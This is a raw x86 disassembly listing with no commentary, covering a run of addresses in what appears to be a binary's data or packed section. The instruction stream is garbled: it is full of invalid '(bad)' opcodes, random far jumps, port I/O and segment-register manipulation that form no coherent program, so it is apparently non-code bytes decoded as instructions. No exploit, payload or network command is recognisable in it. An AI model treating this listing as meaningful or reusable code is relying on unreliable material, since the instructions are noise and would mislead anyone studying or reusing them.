  42675a:	div    DWORD PTR [edi+0x4a]
  42675d:	gs push 0x60
  426760:	mov    edi,0xd8f5672e
  426765:	bound  edx,QWORD PTR ds:0x5b2bcc88
  42676b:	mov    eax,ds:0x62d39353
  426770:	jle    0x426772
  426772:	leave  
  426773:	and    eax,0x3e1e6b89
  426778:	and    BYTE PTR [edx+0x4f48e8f6],bh
  42677e:	or     al,0x66
  426780:	cdq    
  426781:	xchg   esi,eax
  426782:	jp     0x426735
  426784:	rcr    ch,0x5a
  426787:	fsub   QWORD PTR [esi+0x4c51c7d3]
  42678d:	cdq    
  42678e:	neg    esp
  426790:	gs out dx,eax
  426792:	mov    dh,0xec
  426794:	add    eax,0x423fd566
  426799:	jbe    0x4267c0
  42679b:	imul   eax,ebp,0x9bfe09a2
  4267a1:	push   esi
  4267a2:	pop    ds
  4267a3:	iret   
  4267a4:	sub    cl,BYTE PTR ds:[ebp-0xa49cc0a]
  4267ab:	mov    esp,0x79cba077
  4267b0:	(bad)  
  4267b1:	sbb    DWORD PTR [eax+0x6a],0xffffff94
  4267b5:	xchg   ebx,eax
  4267b6:	fld    DWORD PTR [ebx+0x2d]
  4267b9:	test   eax,0x9e4e56b2
  4267be:	mov    ebx,0x60cf650f
  4267c3:	or     esi,DWORD PTR [edx+0x3a38f39e]
  4267c9:	int3   
  4267ca:	or     DWORD PTR [edx-0x5fd70e64],eax
  4267d0:	cdq    
  4267d1:	mov    esp,fs
  4267d3:	outs   dx,DWORD PTR ds:[esi]
  4267d4:	dec    edx
  4267d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267d6:	in     al,0x1
  4267d8:	xchg   DWORD PTR [edi+0x6ac490f],esi
  4267de:	inc    ebx
  4267df:	push   0x40
  4267e1:	push   ss
  4267e2:	push   ecx
  4267e3:	cmp    BYTE PTR [ebx-0x18],ah
  4267e6:	ja     0x42680d
  4267e8:	jmp    0x42677a
  4267ea:	stos   BYTE PTR es:[edi],al
  4267eb:	loope  0x42682e
  4267ed:	adc    dh,bl
  4267ef:	xchg   ecx,eax
  4267f0:	lock add eax,0x8ade0ce9
  4267f6:	dec    ebx
  4267f7:	in     al,dx
  4267f8:	fdivr  DWORD PTR [eax+0x6fe2668f]
  4267fe:	jp     0x426814
  426800:	test   eax,0xe10a92e
  426805:	loope  0x42681f
  426807:	adc    al,0x49
  426809:	xchg   ecx,eax
  42680a:	xchg   ebp,eax
  42680b:	nop
  42680c:	mov    ds:0xe43dfca6,al
  426811:	retf   0xa3e3
  426814:	adc    BYTE PTR [ebp+0x3bda34d2],al
  42681a:	jecxz  0x42689a
  42681c:	add    edx,DWORD PTR [ebx]
  42681e:	test   BYTE PTR [edx-0x513c8d74],dl
  426824:	add    ah,al
  426826:	das    
  426827:	repz out 0x39,al
  42682a:	xor    DWORD PTR [edx+0x472d8f43],esi
  426830:	ret    0x1547
  426833:	js     0x42686b
  426835:	jmp    0xd74f:0xf226ab22
  42683c:	ficom  WORD PTR [esi+0x2]
  42683f:	xchg   BYTE PTR [esi],bl
  426841:	pop    eax
  426842:	(bad)  
  426843:	(bad)  
  426844:	mov    dl,0x6e
  426846:	aaa    
  426847:	test   al,0x39
  426849:	adc    al,0xf8
  42684b:	pop    ecx
  42684c:	and    esp,eax
  42684e:	clc    
  42684f:	or     cl,ah
  426851:	call   DWORD PTR [eax+eax*4-0x54]
  426855:	sbb    al,0x52
  426857:	into   
  426858:	adc    esp,DWORD PTR [edi+0x51]
  42685b:	div    dh
  42685d:	adc    eax,DWORD PTR [eax-0x3e]
  426860:	ud2    
  426862:	(bad)  
  426863:	gs mov edi,0x5b2fb40
  426869:	pop    edx
  42686a:	jmp    0x426849
  42686c:	(bad)  
  42686d:	or     edi,DWORD PTR [ecx]
  42686f:	rcl    esp,cl
  426871:	jge    0x42681a
  426873:	push   ss
  426874:	daa    
  426875:	test   al,bl
  426877:	ret    0xa368
  42687a:	xor    al,0x24
  42687c:	call   0x458b658f
  426881:	xor    al,dh
  426883:	ror    ebx,1
  426885:	sahf   
  426886:	shl    BYTE PTR [edi-0x18],cl
  426889:	adc    al,0xfb
  42688b:	and    ebx,DWORD PTR [eax]
  42688d:	retf   
  42688e:	shr    DWORD PTR [edx-0x77],0x42
  426892:	les    edi,FWORD PTR [edx-0x77e89a4c]
  426898:	xchg   edx,eax
  426899:	lock lods al,BYTE PTR ds:[esi]
  42689b:	lock rol DWORD PTR [edx],1
  42689e:	jbe    0x426831
  4268a0:	jns    0x4268e8
  4268a2:	loop   0x426900
  4268a4:	into   
  4268a5:	lds    edx,FWORD PTR [edi+eax*4-0x711ae8d7]
  4268ac:	retf   
  4268ad:	or     DWORD PTR [esi-0x7d],0x68
  4268b1:	gs cwde 
  4268b3:	xchg   ebx,eax
  4268b4:	cwde   
  4268b5:	adc    BYTE PTR [edi+0x26],ch
  4268b8:	aas    
  4268b9:	sub    ebx,DWORD PTR ds:0x1aeb9636
  4268bf:	js     0x4268bb
  4268c1:	adc    eax,0xf96c137f
  4268c6:	pop    ss
  4268c7:	loope  0x42689b
  4268c9:	and    BYTE PTR [edx+0x3f78835c],dh
  4268cf:	pushf  
  4268d0:	loope  0x4268d2
  4268d2:	dec    ecx
  4268d3:	ins    BYTE PTR es:[edi],dx
  4268d4:	fstp   TBYTE PTR [eax-0x705862d2]
  4268da:	fild   QWORD PTR [ebx]
  4268dc:	pop    ds
  4268dd:	xchg   ecx,eax
  4268de:	ins    BYTE PTR es:[edi],dx
  4268df:	pop    ds
  4268e0:	jge    0x4268f8
  4268e2:	sub    BYTE PTR [ecx-0x4d0c7c63],bl
  4268e8:	sbb    al,BYTE PTR [ebx+esi*1]
  4268eb:	jae    0x426904
  4268ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268ee:	pop    eax
  4268ef:	ficomp DWORD PTR [ecx-0x3af933b2]
  4268f5:	retf   
  4268f6:	add    ch,BYTE PTR [ecx-0x2d088c57]
  4268fc:	inc    esi
  4268fd:	ret    
  4268fe:	imul   DWORD PTR [edx-0x46]
  426901:	jne    0x42690d
  426903:	add    DWORD PTR [esi+0x2c],ebx
  426906:	cwde   
  426907:	fwait
  426908:	jno    0x4268e6
  42690a:	nop
  42690b:	aam    0x3
  42690d:	aad    0x70
  42690f:	loop   0x426960
  426911:	or     BYTE PTR [esi+0x3b],bl
  426914:	add    ch,BYTE PTR [edi-0x5ee34576]
  42691a:	enter  0x30d2,0x19
  42691e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42691f:	mov    cl,0x59
  426921:	xchg   ecx,eax
  426922:	les    eax,FWORD PTR [esi-0x5c]
  426925:	fwait
  426926:	xor    al,0x46
  426928:	es cmp al,0xc8
  42692b:	gs dec esi
  42692d:	rcr    ebx,0x85
  426930:	fwait
  426931:	lock fs mov ebp,0xb80e27fd
  426938:	(bad)  
  42693a:	fdivr  st,st(7)
  42693c:	je     0x42693f
  42693e:	movnti DWORD PTR [edi+0x4d58065b],ebx
  426945:	sub    al,cl
  426947:	fisubr WORD PTR [ebx-0x15]
  42694a:	jno    0x4268e1
  42694c:	and    eax,0xdec1f7cc
  426951:	jnp    0x42691a
  426953:	cmp    al,0x2f
  426955:	dec    edx
  426956:	lahf   
  426957:	add    esp,ecx
  426959:	dec    esp
  42695a:	mov    bh,0x4a
  42695c:	aad    0x63
  42695e:	fild   WORD PTR [eax-0x7]
  426961:	aad    0x46
  426963:	cmp    BYTE PTR [eax+0x10],0x83
  426967:	pop    edi
  426968:	and    al,0xb1
  42696a:	mov    ds:0x97e3f7e1,eax
  42696f:	daa    
  426970:	cmp    BYTE PTR [eax],dl
  426972:	call   0x99ed4905
  426977:	inc    esi
  426978:	(bad)  
  426979:	adc    eax,ecx
  42697b:	mov    al,ds:0xd17e5e5f
  426980:	repnz sub ebp,DWORD PTR [ecx-0x5d]
  426984:	mov    ds:0xfd6df355,eax
  426989:	enter  0xb811,0x92
  42698d:	or     BYTE PTR [ebp-0x51],bl
  426990:	ds dec ebp
  426992:	push   ecx
  426993:	out    dx,al
  426994:	loope  0x42692e
  426996:	retf   
  426997:	pop    ds
  426998:	in     eax,dx
  426999:	sub    al,0x8f
  42699b:	pusha  
  42699c:	mov    ebp,0x5e63bf50
  4269a1:	pushf  
  4269a2:	(bad)  
  4269a3:	scas   al,BYTE PTR es:[edi]
  4269a4:	int3   
  4269a5:	jecxz  0x4269e0
  4269a7:	sti    
  4269a8:	sub    al,ah
  4269aa:	out    0x12,al
  4269ac:	pop    ecx
  4269ad:	add    eax,0x3b600fa4
  4269b2:	out    0x4a,eax
  4269b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	dec    ecx
  4269b6:	cld    
  4269b7:	in     eax,0xc4
  4269b9:	fldenv ds:0x1f5ed3b5
  4269bf:	xor    al,0x49
  4269c1:	sbb    al,0x51
  4269c3:	xor    eax,0x4549a12d
  4269c8:	push   0x4078773e
  4269cd:	inc    eax
  4269ce:	test   al,0x9
  4269d0:	icebp  
  4269d1:	and    DWORD PTR [ecx+0x12],ecx
  4269d4:	out    0x49,al
  4269d6:	sbb    ah,BYTE PTR [edx-0x76f3b460]
  4269dc:	jo     0x426a27
  4269de:	sbb    al,0x56
  4269e0:	add    BYTE PTR [eax+0x4ea147ee],dl
  4269e6:	sbb    al,0xdb
  4269e8:	es js  0x426a50
  4269eb:	adc    DWORD PTR [edi+ebx*2],0x43bfce04
  4269f2:	xchg   ecx,eax
  4269f3:	dec    edi
  4269f4:	cmp    esi,0xbea457ec
  4269fa:	mov    ds:0x97755878,al
  4269ff:	jp     0x426a70
  426a01:	pop    es
  426a02:	les    ebx,FWORD PTR [eax]
  426a04:	(bad)  
  426a05:	es sbb al,0x76
  426a08:	dec    bp
  426a0a:	push   ebx
  426a0b:	pop    es
  426a0c:	add    eax,DWORD PTR [eax]
  426a0e:	daa    
  426a0f:	jmp    0xfd71:0x7151a762
  426a16:	jmp    0xe71f:0x2a1a5f10
  426a1d:	or     dh,ah
  426a1f:	daa    
  426a20:	ror    BYTE PTR [eax+0x7e192739],1
  426a26:	test   al,0x16
  426a28:	jne    0x4269cc
  426a2a:	or     ah,bl
  426a2c:	cmp    eax,0x82602eb1
  426a31:	and    al,0xde
  426a33:	mov    edx,0x1cd59b7d
  426a38:	mov    dl,bh
  426a3a:	inc    ebx
  426a3b:	mov    edi,0x97e0b6b7
  426a40:	push   ss
  426a41:	iret   
  426a42:	adc    ah,dl
  426a44:	imul   esp,esp,0xb9b9f885
  426a4a:	repnz mov dh,BYTE PTR [edx-0x38dd3bb6]
  426a51:	mov    bl,0xf7
  426a53:	cmp    cl,BYTE PTR [edx+esi*4]
  426a56:	dec    edx
  426a57:	push   edx
  426a58:	mov    ebp,0xda135a64
  426a5d:	std    
  426a5e:	repnz fs stos DWORD PTR es:[edi],eax
  426a61:	push   ds
  426a62:	bound  ebp,QWORD PTR [ebp-0x13eb771e]
  426a68:	sub    dh,BYTE PTR [edi-0x4bb5f5f6]
  426a6e:	icebp  
  426a6f:	es add ebx,eax
  426a72:	sub    BYTE PTR [edi+0x37],dh
  426a75:	xchg   edx,eax
  426a76:	test   eax,0xbc87e8a5
  426a7b:	sub    ch,dl
  426a7d:	push   edx
  426a7e:	retf   0x8a94
  426a81:	xor    BYTE PTR [edx+0x71fef7f2],ah
  426a87:	xlat   BYTE PTR ds:[ebx]
  426a88:	push   eax
  426a89:	jmp    0x8271682c
  426a8e:	inc    edx
  426a8f:	fidiv  WORD PTR [esi+ecx*4]
  426a92:	pop    ebx
  426a93:	hlt    
  426a94:	loopne 0x426a42
  426a96:	ins    DWORD PTR es:[edi],dx
  426a97:	(bad)
  426a9a:	ret    
  426a9b:	jnp    0x426aa6
  426a9d:	xchg   esp,eax
  426a9e:	data16 ds aaa 
  426aa1:	(bad)  [eax]
  426aa3:	fisttp DWORD PTR [ecx-0x7c1870a]
  426aa9:	sub    dh,cl
  426aab:	neg    ebx
  426aad:	ss jo  0x426afb
  426ab0:	(bad)  
  426ab1:	fcmovne st,st(4)
  426ab3:	lods   al,BYTE PTR ds:[esi]
  426ab4:	data16 daa 
  426ab6:	adc    BYTE PTR [ebp+0xd],ah
  426ab9:	mov    al,0xc6
  426abb:	cmp    DWORD PTR [ebx+0x71],ecx
  426abe:	mov    dh,0x22
  426ac0:	xchg   ecx,eax
  426ac1:	sahf   
  426ac2:	fwait
  426ac3:	out    0xcf,al
  426ac5:	out    0xe5,eax
  426ac7:	or     dl,cl
  426ac9:	pop    ds
  426aca:	imul   esi,DWORD PTR [ebp-0x49],0x48
  426ace:	leave  
  426acf:	cmp    DWORD PTR [esi-0x74f24e27],ebp
  426ad5:	imul   esp,DWORD PTR [ebx],0x3d52fb0d
  426adb:	(bad)  [esi-0x48082c15]
  426ae1:	call   0x62b347cc
  426ae6:	dec    edi
  426ae7:	test   eax,0x7aa7401b
  426aec:	jbe    0x426afc
  426aee:	add    eax,ecx
  426af0:	sub    al,BYTE PTR [edi-0x79]
  426af3:	call   0x83c24afa
  426af8:	cmp    eax,0x933f7b0d
  426afd:	sbb    dl,BYTE PTR [ebx-0x3658a61d]
  426b03:	mov    cl,0x2d
  426b05:	rol    DWORD PTR [edi+0x72],0x8b
  426b09:	inc    esi
  426b0a:	int    0x14
  426b0c:	xor    DWORD PTR [edi],esp
  426b0e:	push   0xe04eacda
  426b13:	sbb    edx,edi
  426b15:	sbb    DWORD PTR [esi+0x42],ecx
  426b18:	out    0x26,eax
  426b1a:	retf   
  426b1b:	adc    BYTE PTR fs:[esi+0x70a6976e],cl
  426b22:	xor    BYTE PTR [esi+edi*4-0x31],al
  426b26:	or     edi,DWORD PTR [edi+0xc]
  426b29:	loopne 0x426afb
  426b2b:	pop    eax
  426b2c:	or     al,0xf2
  426b2e:	rcl    BYTE PTR [esi+0x318acea0],0x8
  426b35:	inc    edx
  426b36:	inc    ebx
  426b37:	push   es
  426b38:	retf   0x3ffe
  426b3b:	and    al,0x57
  426b3d:	inc    ebx
  426b3e:	(bad)
  426b42:	inc    edi
  426b43:	or     dl,BYTE PTR [edx-0x4fda60a]
  426b49:	cmp    dh,BYTE PTR [edx+0x70a536ac]
  426b4f:	das    
  426b50:	jmp    0x6c71:0xcaebd24c
  426b57:	(bad)  
  426b58:	in     al,0x5
  426b5a:	mov    DWORD PTR [eax+0x2a],esp
  426b5d:	adc    eax,0xb0fcba94
  426b62:	mov    ds:0x97173a6d,al
  426b67:	pop    ebp
  426b68:	imul   ebx,DWORD PTR [esi+0x2cf7770a],0x4d170d35
  426b72:	call   0x97f3:0x6c6312a
  426b79:	pop    ebx
  426b7a:	push   es
  426b7b:	in     eax,dx
  426b7c:	test   DWORD PTR [eax+eax*1+0x0],edx
	...
  426b88:	add    BYTE PTR [eax],al
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0xaa81,0x93
  426b98:	hlt    
  426b99:	sbb    DWORD PTR [eax+edi*8+0x6740001],eax
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	sub    bh,ch
  426ba4:	popf   
  426ba5:	rcl    BYTE PTR [ecx+0x3b],0xcf
  426ba9:	or     eax,esp
  426bab:	pushf  
  426bac:	ss (bad) 
  426bae:	jnp    0x426bde
  426bb0:	lods   eax,DWORD PTR ds:[esi]
  426bb1:	pop    eax
  426bb2:	js     0x426b45
  426bb4:	xchg   BYTE PTR [eax+ebp*1],cl
  426bb7:	xor    BYTE PTR [ecx-0x84d00df],0x72
  426bbe:	out    0xe4,al
  426bc0:	retf   0xe80f
  426bc3:	iret   
  426bc4:	loopne 0x426bbf
  426bc6:	leave  
  426bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bc8:	(bad)
  426bcd:	mov    ebx,0x17b2d486
  426bd2:	pop    edi
  426bd3:	imul   ebp,esp,0xffffffe6
  426bd6:	cmp    eax,0x4a5c3f0a
  426bdb:	ds cwde 
  426bdd:	idiv   DWORD PTR [esi]
  426bdf:	or     DWORD PTR [eax-0x5e],0x38b8dad1
  426be6:	mov    bh,0xc3
  426be8:	dec    ebp
  426be9:	(bad)  
  426bea:	ror    DWORD PTR [edi+eiz*4+0x674fafab],1
  426bf1:	(bad)  
  426bf2:	(bad)  
  426bf3:	outs   dx,DWORD PTR ds:[esi]
  426bf4:	push   ds
  426bf5:	mov    cl,0xe4
  426bf7:	jp     0x426c1e
  426bf9:	clc    
  426bfa:	(bad)  
  426bfb:	push   ebx
  426bfc:	ret    0xfb47
  426bff:	test   DWORD PTR [esi-0xd],ebp
  426c02:	dec    edi
  426c03:	dec    esi
  426c04:	or     BYTE PTR [ebx],ch
  426c06:	mov    ah,0xff
  426c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c09:	aaa    
  426c0a:	xor    bl,BYTE PTR [esi-0x10]
  426c0d:	inc    ebp
  426c0e:	sub    al,0x3f
  426c10:	icebp  
  426c11:	mov    ebp,cs
  426c13:	jae    0x426c8f
  426c15:	in     eax,0xd8
  426c17:	das    
  426c18:	(bad)  
  426c19:	mov    bl,0x17
  426c1b:	mov    ebx,0x75453ee5
  426c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c21:	push   cs
  426c22:	pop    ebp
  426c23:	ret    
  426c24:	enter  0x6ad8,0xa
  426c28:	aad    0x9
  426c2a:	push   ecx
  426c2b:	jle    0x426c79
  426c2d:	data16 jb 0x426bba
  426c30:	mov    esi,0xc5098b57
  426c35:	jb     0x426be9
  426c37:	fsub   st(6),st
  426c39:	fimul  DWORD PTR [ecx-0x7a]
  426c3c:	xchg   esp,eax
  426c3d:	sub    BYTE PTR [edx+edx*1+0x29],al
  426c41:	icebp  
  426c42:	into   
  426c43:	jbe    0x426c6c
  426c45:	sub    cl,BYTE PTR [eax+0x68]
  426c48:	div    DWORD PTR [edi]
  426c4a:	add    esi,ebp
  426c4c:	jns    0x426c3b
  426c4e:	xchg   DWORD PTR [ecx+0x69],ebx
  426c51:	adc    dh,BYTE PTR [edi-0x39]
  426c54:	cdq    
  426c55:	jne    0x426ca8
  426c57:	gs and eax,0x2f646e65
  426c5d:	repnz mov DWORD PTR fs:[edx+0x76fd72b7],ebx
  426c65:	add    DWORD PTR [esi-0x5f],0xfffffff1
  426c69:	ds push ebp
  426c6b:	sbb    eax,0xfb38d01
  426c70:	retf   0x3389
  426c73:	sar    dl,cl
  426c75:	or     edx,0x2
  426c78:	out    0xdf,al
  426c7a:	push   ds
  426c7b:	cmp    DWORD PTR [ecx],0x2ebfa0f3
  426c81:	aam    0x89
  426c83:	mov    ebx,0xe8462227
  426c88:	retf   0x3be3
  426c8b:	scas   eax,DWORD PTR es:[edi]
  426c8c:	xor    al,0xfe
  426c8e:	aaa    
  426c8f:	and    DWORD PTR [ecx],esi
  426c91:	jb     0x426c82
  426c93:	mov    DWORD PTR [ecx],ecx
  426c95:	inc    ebx
  426c96:	push   0x4d9a64be
  426c9b:	int3   
  426c9c:	mov    ch,0x23
  426c9e:	lahf   
  426c9f:	mov    esi,0xd85d48ae
  426ca4:	retf   0x6bc
  426ca7:	gs je  0x426c32
  426caa:	test   eax,0xabf32842
  426caf:	loopne 0x426d0d
  426cb1:	mov    al,ds:0xdfb1c085
  426cb6:	xor    dl,BYTE PTR [edx-0x55]
  426cb9:	popa   
  426cba:	adc    DWORD PTR [esi-0x67],ebp
  426cbd:	mov    BYTE PTR [eax+0x1f],bl
  426cc0:	mov    esi,cs
  426cc2:	not    eax
  426cc4:	jmp    0x739844ee
  426cc9:	lock pop ebp
  426ccb:	mov    ds:0xa6805936,al
  426cd0:	not    DWORD PTR [ebx]
  426cd2:	adc    BYTE PTR [ebp+0x3f],0x50
  426cd6:	test   al,0x76
  426cd8:	and    eax,0xe08a4d14
  426cdd:	sub    dh,al
  426cdf:	imul   ebx,DWORD PTR [ebp-0x11adc7b4],0xd61b809c
  426ce9:	mov    ah,0x5d
  426ceb:	mov    DWORD PTR [edi+0x73114ff],esp
  426cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cf2:	stos   BYTE PTR es:[edi],al
  426cf3:	loope  0x426d6f
  426cf5:	inc    edx
  426cf6:	and    edx,ecx
  426cf8:	out    dx,al
  426cf9:	fsubr  QWORD PTR [edx-0x4de0b7f1]
  426cff:	xchg   edi,eax
  426d00:	ss stc 
  426d02:	cdq    
  426d03:	int    0xcc
  426d05:	shr    cl,1
  426d07:	popw   es
  426d09:	fistp  DWORD PTR [ecx]
  426d0b:	int3   
  426d0c:	sub    al,0x3c
  426d0e:	test   eax,0x2147eefc
  426d13:	lock dec edx
  426d15:	mov    WORD PTR [edx+0x7],ss
  426d18:	pushf  
  426d19:	pop    ecx
  426d1a:	mov    ds:0x9196bc67,al
  426d1f:	mov    esp,0xd6e8cf25
  426d24:	add    BYTE PTR [esi],dl
  426d26:	mov    ebx,0xc5c38a4e
  426d2b:	xor    BYTE PTR [eax-0x61],bl
  426d2e:	arpl   WORD PTR [ebp+0x58b194a6],bx
  426d34:	sbb    BYTE PTR [esi+0xe1f140],dl
  426d3a:	ret    
  426d3b:	addr16 mov ah,0x5e
  426d3e:	sub    edi,edi
  426d40:	stos   DWORD PTR es:[edi],eax
  426d41:	add    eax,DWORD PTR [eax-0x61]
  426d44:	jbe    0x426d5d
  426d46:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d48:	aaa    
  426d49:	mov    ebx,ecx
  426d4b:	test   eax,0x6277e256
  426d50:	xchg   ecx,eax
  426d51:	iret   
  426d52:	cmc    
  426d53:	push   esp
  426d54:	push   ebp
  426d55:	dec    esi
  426d56:	(bad)  
  426d57:	ficom  DWORD PTR [eax-0xe63ab1e]
  426d5d:	mov    eax,ds:0xe84c02db
  426d62:	adc    edx,DWORD PTR [ebp+0x204ca485]
  426d68:	adc    BYTE PTR [esi],dh
  426d6a:	mov    ecx,0x819363bf
  426d6f:	outs   dx,DWORD PTR ds:[esi]
  426d70:	push   edi
  426d71:	sahf   
  426d72:	jl     0x426d9f
  426d74:	mov    ebp,0xd79a2306
  426d79:	icebp  
  426d7a:	and    DWORD PTR [ecx+eax*8],edx
  426d7d:	mov    eax,ds:0xb19a9c50
  426d82:	imul   ebp,DWORD PTR [ecx],0x7e06c83d
  426d88:	loopne 0x426dc1
  426d8a:	scas   al,BYTE PTR es:[edi]
  426d8b:	mov    al,0x67
  426d8d:	int3   
  426d8e:	cli    
  426d8f:	ja     0x426e00
  426d91:	adc    eax,0x858ee314
  426d96:	adc    BYTE PTR [edx],al
  426d98:	hlt    
  426d99:	adc    ebx,eax
  426d9b:	push   ds
  426d9c:	leave  
  426d9d:	inc    ecx
  426d9e:	mov    ebx,0xef605599
  426da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426da4:	aad    0xb9
  426da6:	es pop edx
  426da8:	jno    0x426e09
  426daa:	dec    ebp
  426dab:	dec    edx
  426dac:	xchg   edx,eax
  426dad:	sub    eax,0x56a72735
  426db2:	adc    DWORD PTR [edi],edx
  426db4:	add    al,0xed
  426db6:	je     0x426d3d
  426db8:	jnp    0x426e15
  426dba:	and    BYTE PTR [edi-0x4343edbe],ch
  426dc0:	xchg   esi,eax
  426dc1:	inc    edi
  426dc2:	ror    BYTE PTR [ecx],1
  426dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dc5:	sub    al,0x44
  426dc7:	test   eax,0x967d85aa
  426dcc:	push   esp
  426dcd:	xchg   DWORD PTR [esi],ebx
  426dcf:	push   eax
  426dd0:	push   ebp
  426dd1:	xor    ah,ah
  426dd3:	jp     0x426d55
  426dd5:	add    eax,0x4b9eb4e9
  426dda:	inc    ebx
  426ddb:	enter  0xd246,0x4f
  426ddf:	test   BYTE PTR [eax-0x51],ah
  426de2:	lahf   
  426de3:	sub    DWORD PTR [edi+0xcc61222],esp
  426de9:	out    dx,al
  426dea:	mov    edx,DWORD PTR [eax]
  426dec:	xchg   edx,eax
  426ded:	(bad)  
  426dee:	pop    ebx
  426def:	ret    0x8d8c
  426df2:	sbb    cl,bh
  426df4:	(bad)  [esi]
  426df6:	data16 and al,0x7b
  426df9:	ja     0x426d9e
  426dfb:	mov    ah,0xaa
  426dfd:	or     DWORD PTR [eax-0x72e85219],0x7c9d5415
  426e07:	cdq    
  426e08:	cmp    ebp,DWORD PTR [eax-0x74b87396]
  426e0e:	adc    DWORD PTR [ecx],ebx
  426e10:	mov    ?,edi
  426e12:	out    0xc2,eax
  426e14:	outs   dx,DWORD PTR ds:[esi]
  426e15:	fcom   QWORD PTR [edi]
  426e17:	add    al,0x1a
  426e19:	mov    dh,dl
  426e1b:	jae    0x426e31
  426e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e1e:	pop    edi
  426e1f:	cdq    
  426e20:	cmp    eax,0x344011b1
  426e25:	fs fwait
  426e27:	stc    
  426e28:	leave  
  426e29:	xor    al,0x55
  426e2b:	ds pop ss
  426e2d:	out    0xb0,al
  426e2f:	test   al,0xc0
  426e31:	xchg   ebp,eax
  426e32:	shl    BYTE PTR [esi-0x12],0xca
  426e36:	or     al,0x81
  426e38:	(bad)  [ebp+0x9c2189d]
  426e3e:	in     eax,0x9d
  426e40:	neg    DWORD PTR [esi+0xc5562ee]
  426e46:	int    0x55
  426e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e49:	mov    bl,0x7b
  426e4b:	dec    edi
  426e4c:	sub    ebx,esp
  426e4e:	popa   
  426e4f:	imul   esp,ebx,0x4517d4
  426e55:	fdiv   QWORD PTR [edi]
  426e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e58:	inc    BYTE PTR [ebp+0x115954c0]
  426e5e:	pop    esp
  426e5f:	pop    ebp
  426e60:	add    eax,0xf29d0a48
  426e65:	jno    0x426e34
  426e67:	mov    cs,ecx
  426e69:	sub    ecx,DWORD PTR [edi]
  426e6b:	or     DWORD PTR [edx-0x7e9fbefe],0x2e
  426e72:	fadd   QWORD PTR [edi+0x5e]
  426e75:	cmp    eax,0xcf72c6e4
  426e7a:	and    DWORD PTR [ebp-0x6c8c7b8c],edx
  426e80:	jno    0x426efc
  426e82:	add    BYTE PTR [eax-0x6b],cl
  426e85:	das    
  426e86:	xor    DWORD PTR [ebx+0x103af0e2],ecx
  426e8c:	inc    esp
  426e8d:	leave  
  426e8e:	adc    BYTE PTR [ecx-0x22ae2c77],ch
  426e94:	add    ebp,DWORD PTR [ebp+0x1e]
  426e97:	imul   ebp,esp,0xffffff85
  426e9a:	ja     0x426e98
  426e9c:	dec    ebx
  426e9d:	ror    ch,cl
  426e9f:	popa   
  426ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ea1:	xor    edi,DWORD PTR [esi]
  426ea3:	lods   eax,DWORD PTR ds:[esi]
  426ea4:	ja     0x426ec9
  426ea6:	pop    es
  426ea7:	mov    cl,0xbc
  426ea9:	xor    ebp,DWORD PTR [ebx+0x72]
  426eac:	sbb    dh,al
  426eae:	and    al,0x9d
  426eb0:	popa   
  426eb1:	rcr    edi,0x5d
  426eb4:	mov    ecx,edi
  426eb6:	xor    bl,ah
  426eb8:	xchg   ecx,eax
  426eb9:	ds pusha 
  426ebb:	dec    ecx
  426ebc:	push   eax
  426ebd:	adc    BYTE PTR [ebp+0x7c],ch
  426ec0:	dec    esp
  426ec1:	dec    eax
  426ec2:	bound  esi,QWORD PTR [esi+0x5]
  426ec5:	aas    
  426ec6:	or     dl,ch
  426ec8:	xchg   esp,eax
  426ec9:	jge    0x426e5e
  426ecb:	std    
  426ecc:	test   al,0xad
  426ece:	sahf   
  426ecf:	push   esp
  426ed0:	dec    esp
  426ed1:	hlt    
  426ed2:	not    DWORD PTR [ebp-0x4f9a941a]
  426ed8:	add    BYTE PTR [ebx+0x4abf5082],ah
  426ede:	fmul   DWORD PTR [esi]
  426ee0:	push   ebx
  426ee1:	xor    esi,edi
  426ee3:	jmp    0x8d1c:0x1a8f4224
  426eea:	cmp    BYTE PTR [ecx+0x472f716b],ah
  426ef0:	inc    ecx
  426ef1:	(bad)  
  426ef2:	data16 mov bh,0x93
  426ef5:	dec    ebp
  426ef6:	std    
  426ef7:	fistp  DWORD PTR [ecx-0x6e]
  426efa:	stc    
  426efb:	lock ja 0x426ed0
  426efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eff:	nop
  426f00:	or     al,0x28
  426f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f03:	dec    ebx
  426f04:	scas   al,BYTE PTR es:[edi]
  426f05:	dec    esi
  426f06:	sbb    ch,BYTE PTR [ebx]
  426f08:	cmp    esp,edx
  426f0a:	(bad)  
  426f0b:	jo     0x426ee7
  426f0d:	push   ebx
  426f0e:	in     al,0x61
  426f10:	mov    esp,0x1cef6391
  426f15:	mov    cl,BYTE PTR [ebx]
  426f17:	fcom   DWORD PTR [eax]
  426f19:	je     0x426f8a
  426f1b:	sub    BYTE PTR [edi],cl
  426f1d:	push   edi
  426f1e:	jecxz  0x426ec8
  426f20:	cmp    eax,0xb0254e34
  426f25:	xchg   ecx,eax
  426f26:	mov    esp,0x3bacaf09
  426f2b:	or     edx,DWORD PTR [edi]
  426f2d:	mov    ebp,0x559ce301
  426f32:	jmp    0xb16b:0xec4a936c
  426f39:	sbb    al,BYTE PTR [eax-0x50a93ac1]
  426f3f:	push   esp
  426f40:	cmp    BYTE PTR [ecx-0x2891abc6],bl
  426f46:	das    
  426f47:	mov    ah,0xab
